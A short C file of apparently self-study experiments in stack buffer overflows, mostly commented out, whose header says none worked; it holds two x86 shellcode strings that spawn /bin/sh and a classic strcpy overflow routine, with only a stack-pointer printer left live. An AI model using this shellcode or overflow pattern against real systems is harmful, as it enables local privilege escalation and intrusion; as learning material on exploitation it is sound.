/* This file includes a variety of attempts at opening a shell
via buffer overflows, and just writing and running shell code in general.
None of these solutions actually worked.
*/

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

// void main(){
// 	printf("%lu\n", sizeof(long));
// }

// char shellcode[] =
// "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
// "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
// "\x80\xe8\xdc\xff\xff\xff/bin/sh";

// char large_string[128];

// void main() {
// 	char buffer[96];
// 	int i;
// 	long *long_ptr = (long *) large_string;
// 	for (i = 0; i < 32; i++)
// 		*(long_ptr + i) = (int) buffer;
// 	for (i = 0; i < strlen(shellcode); i++)
// 		large_string[i] = shellcode[i];
// 	strcpy(buffer,large_string);
// }

// unsigned long get_sp(void) {
// __asm__("movl %esp,%eax");
// }
// void main() {
// printf("0x%x\n", get_sp());
// }

// char shellcode[] = "j\x0bX\x99Rhn/shh//bi\x89\xe3RS\x89\xe1\xcd\x80";

// void main() {
//    asm("exit:"
//         "movl    $1, %eax"
//         "movl    $0, %ebx"
//         "int $0x80"
//     );
// }

unsigned long get_sp(void) {
	__asm__("movl %esp,%eax");
}
void main() {
	printf("0x%x\n", get_sp());
}